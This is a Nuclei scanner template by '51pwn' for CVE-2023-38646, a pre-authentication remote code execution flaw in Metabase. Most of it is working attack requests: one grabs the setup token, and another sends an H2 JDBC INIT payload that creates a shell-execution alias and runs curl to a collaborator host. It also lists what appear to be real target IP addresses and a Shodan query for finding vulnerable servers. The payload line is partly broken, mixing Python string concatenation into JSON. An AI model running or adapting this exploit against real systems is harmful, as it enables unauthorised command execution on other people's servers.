id: CVE-2023-38646_51pwn

info:
  name: H2 Metabase Pre-auth RCE
  author: 51pwn
  severity: critical
  description: |
    doNuclei https://181.188.0.131 ~/MyWork/mybugbounty/yaml/CVE-2022-1388.yaml
    http://212.72.204.206:3000/api/session/properties
    Metabase open source before 0.46.6.1 and 
    Metabase Enterprise before 1.46.6.1 allow attackers to execute arbitrary commands 
    on the server, at the server's privilege level. Authentication is not required for exploitation. 
    The other fixed versions are 0.45.4.1, 1.45.4.1, 0.44.7.1, 1.44.7.1, 0.43.7.2, and 1.43.7.2
  reference:
    - https://github.com/shamo0/CVE-2023-38646-PoC/blob/main/README.md
    - https://www.metabase.com/blog/security-advisory
    - https://blog.calif.io/p/reproducing-cve-2023-38646-metabase
    - https://blog.assetnote.io/2023/07/22/pre-auth-rce-metabase/
  metadata:
    shodan-query: product:"Metabase" port:3000
    verified: true
  tags: H2,cve,cve2023,rce,Metabase

requests:
  - raw:
      - |
        GET /api/session/properties HTTP/1.1
        Host: {{Hostname}}
        Upgrade-Insecure-Requests:1
        Accept: application/json
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
        connection: close

  - raw:
      - |
        POST /api/setup/validate HTTP/1.1
        Host: {{Hostname}}
        Accept: application/json
        Content-Type: application/json
        connection: close

        {
          "details": {
              "details": {
                  "advanced-options": True,
                  "classname": "org.h2.Driver",
                  "subname": "mem:;TRACE_LEVEL_SYSTEM_OUT=3;INIT=CREATE ALIAS SHELLEXEC AS $$ void shellexec(String cmd) throws java.io.IOException {Runtime.getRuntime().exec(new String[]{\"sh\", \"-c\", cmd})\\;}$$\\;CALL SHELLEXEC('curl -d key=shamooo " + args.collaborator + "');",
                  "subprotocol": "h2"
              },
              "engine": "postgres",
              "name": "x"
          },
          "token": {{token}}
        }
    matchers-condition: and
    matchers:
      # - type: regex
      #   regex:
      #     - "(commandResult)"
      #     - "(uid=\\d+\\(.*)"
      - type: status
        status:
          - 200
        condition: and
    extractors:
      - type: regex
        name: token
        part: body
        group: 1
        regex:
          - "\"setup-token\":\"([^\"]+)\""